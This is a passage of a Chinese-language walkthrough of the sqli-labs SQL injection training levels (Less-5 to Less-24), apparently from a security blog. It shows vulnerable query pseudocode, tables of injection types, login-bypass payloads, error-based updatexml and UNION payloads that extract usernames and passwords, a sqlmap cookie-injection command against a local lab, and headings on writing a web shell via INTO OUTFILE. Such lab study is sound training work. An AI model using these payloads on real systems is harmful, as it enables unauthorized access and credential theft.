&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;less-5&#34;&gt;Less-5&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
if true:
	打印 &#39;You are in ...&#39;;
else:
	print_r(mysql_error());
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;缺少回显机制，但可以依靠盲注和显错&lt;/p&gt;
&lt;h2 id=&#34;less-6&#34;&gt;Less-6&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;缺少回显机制，可以依靠盲注和显错&lt;/p&gt;
&lt;h2 id=&#34;less-7&#34;&gt;Less-7&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&amp;quot;;
if true:
	打印 &#39;You are in.... Use outfile......&#39;;
else:
	//print_r(mysql_error());
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号+双括号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;缺少回显机制和报错机制，只能依靠盲注&lt;/p&gt;
&lt;h3 id=&#34;into-outfile&#34;&gt;into outfile&lt;/h3&gt;
&lt;h3 id=&#34;写敏感信息&#34;&gt;写敏感信息&lt;/h3&gt;
&lt;p&gt;前提是要知道网站根目录路径，确保写入后可以访问到&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1235; 
			flex-basis: 2964px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904.png&#34; data-size=&#34;840x68&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904.png&#34;
			width=&#34;840&#34;
			height=&#34;68&#34;
			srcset=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904_hu7cc1143b2b8b63f113c758364eb7e090_13330_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20210708213717904_hu7cc1143b2b8b63f113c758364eb7e090_13330_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一开始是写不进去，因为网站用户对根目录下没有写权限，尝试更改权限后成功写入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;写shell&#34;&gt;写shell&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1316; 
			flex-basis: 3159px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244.png&#34; data-size=&#34;724x55&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244.png&#34;
			width=&#34;724&#34;
			height=&#34;55&#34;
			srcset=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244_hu07de41f1bb0479f0ef6fa31a83e711df_13984_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20210708214541244_hu07de41f1bb0479f0ef6fa31a83e711df_13984_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-8&#34;&gt;Less-8&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;同Less-7&lt;/p&gt;
&lt;h2 id=&#34;less-9&#34;&gt;Less-9&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
if true:
	打印 &#39;You are in....&#39;;
else:
	打印 &#39;You are in....&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;无论true或false，全都打印同一字符串，无法bool盲注，只能延时盲注&lt;/p&gt;
&lt;h2 id=&#34;less-10&#34;&gt;Less-10&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号&lt;/td&gt;
&lt;td&gt;延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;同Less-9&lt;/p&gt;
&lt;h2 id=&#34;less-11&#34;&gt;Less-11&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$uname=$_POST[&#39;uname&#39;];
$passwd=$_POST[&#39;passwd&#39;];

@$sql=&amp;quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&amp;quot;;

if true:
	打印结果
else:
	print_r(mysql_error());
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;万能密码&#34;&gt;万能密码&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uname=admin&#39;--+&amp;amp;passwd=
uname=admin&#39;#&amp;amp;passwd=

uname=admin&amp;amp;passwd=1&#39; or 1--+&amp;amp;submit=Submit
uname=admin&amp;amp;passwd=1&#39;||1--+&amp;amp;submit=Submit
uname=admin&amp;amp;passwd=1&#39; or 1#&amp;amp;submit=Submit
uname=admin&amp;amp;passwd=1&#39;||1#&amp;amp;submit=Submit

uname=admin&amp;amp;passwd=1&#39;or&#39;1&#39;=&#39;1&amp;amp;submit=Submit
uname=admin&amp;amp;passwd=1&#39;||&#39;1&#39;=&#39;1&amp;amp;submit=Submit
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;注意&#34;&gt;注意&lt;/h3&gt;
&lt;p&gt;POST注入最好走bp&lt;/p&gt;
&lt;h2 id=&#34;less-12&#34;&gt;Less-12&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-双引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-11一致&lt;/p&gt;
&lt;h2 id=&#34;less-13&#34;&gt;Less-13&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单引号+单括号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;不回显查询结果，除了union其他都可&lt;/p&gt;
&lt;h2 id=&#34;less-14&#34;&gt;Less-14&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-双引号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;不回显查询结果，除了union其他都可&lt;/p&gt;
&lt;h2 id=&#34;less-15&#34;&gt;Less-15&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单引号&lt;/td&gt;
&lt;td&gt;bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;不回显查询结果，不报错&lt;/p&gt;
&lt;h2 id=&#34;less-16&#34;&gt;Less-16&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-双引号+单括号&lt;/td&gt;
&lt;td&gt;bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;不回显查询结果，不报错&lt;/p&gt;
&lt;h2 id=&#34;less-17&#34;&gt;Less-17&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uname&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;  
&lt;span class=&#34;nv&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT username, password FROM users WHERE username= &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;语句有结果：&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;$update&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UPDATE users SET password = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; WHERE username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql报错：&lt;/span&gt;
		 &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单括号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;uname参数被过滤，只能考虑给一个正确的uname值进入分支，对update语句进行注入&lt;/p&gt;
&lt;p&gt;无数据回显&lt;/p&gt;
&lt;h2 id=&#34;less-18&#34;&gt;Less-18&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uagent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$uname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uname&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$passwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT  users.username, users.password FROM users WHERE users.username=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and users.password=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ORDER BY users.id DESC LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;语句有结果：&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$insert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uagent&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$IP&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;, &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;输出&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uagent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单括号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;该注入类型为insert注入，首先需要给一个正确的用户名、密码进入分析，对insert语句进行注入&lt;/p&gt;
&lt;p&gt;insert注入必须要闭合后面语句&lt;/p&gt;
&lt;p&gt;如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1
&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;)--+
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-19&#34;&gt;Less-19&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单括号&lt;/td&gt;
&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;类似18，注入点在referer头&lt;/p&gt;
&lt;h2 id=&#34;less-20&#34;&gt;Less-20&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if cookie中没有uname参数：
	输出登录信息;
	if 提交uname和passwd：
		$uname = check_input($_POST[&#39;uname&#39;]);
        $passwd = check_input($_POST[&#39;passwd&#39;]);
        $sql=&amp;quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&amp;quot;;
        $cookee = $row1[&#39;username&#39;];
        if 有返回结果:
        	setcookie(&#39;uname&#39;, $cookee, time()+3600);
        else:
        	print_r(mysql_error());
else:
	if 没有提交submit参数：
		$cookee = $_COOKIE[&#39;uname&#39;];
		$sql=&amp;quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&amp;quot;;
		if 没有返回结果:
			输出 mysql_error();
		if 有返回结果:
			回显查询结果;
	else:
		setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600); //通过把失效日期设置为过去的日期/时间，删除一个 cookie
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单括号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;cookie中uname参数没有过滤，有数据回显、有报错&lt;/p&gt;
&lt;h3 id=&#34;sqlmap-带cookie注入用法&#34;&gt;sqlmap 带cookie注入用法&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//UINION  其中 “-p 参数” 表示要测试的参数，这时--level失效；也可以使用&#39;*&#39;去标记参数
sqlmap -u &amp;quot;http://127.0.0.1:8888/Less-20/&amp;quot; --cookie=&amp;quot;uname=admin&amp;quot; -p &amp;quot;cookie&amp;quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-21&#34;&gt;Less-21&lt;/h2&gt;
&lt;p&gt;代码逻辑和Less-20类似，只不过获取set cookie时用了base64编码，获取cookie值时再解码拼入sql语句&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单括号+单括号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;less-22&#34;&gt;Less-22&lt;/h2&gt;
&lt;p&gt;类似Less-21&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-双引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;less-23&#34;&gt;Less-23&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;//过滤了注释符
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/#/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$reg1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/--/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;过滤注释后，就需要闭合原始sql语句&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;UNION 注入使用from，在闭合原始语句时候需要引入where保证sql语句语法正确，例如：&lt;/p&gt;
&lt;p&gt;-1&#39; union select 1,group_concat(username,&#39;:&#39;,password),3 from security.users where 1 and &amp;lsquo;1&amp;rsquo; = &amp;lsquo;1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;less-24二次注入&#34;&gt;Less-24(二次注入)&lt;/h2&gt;
&lt;p&gt;login_create.php&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$username=  mysql_escape_string($_POST[&#39;username&#39;]) ;
$pass= mysql_escape_string($_POST[&#39;password&#39;]);
$re_pass= mysql_escape_string($_POST[&#39;re_password&#39;]);

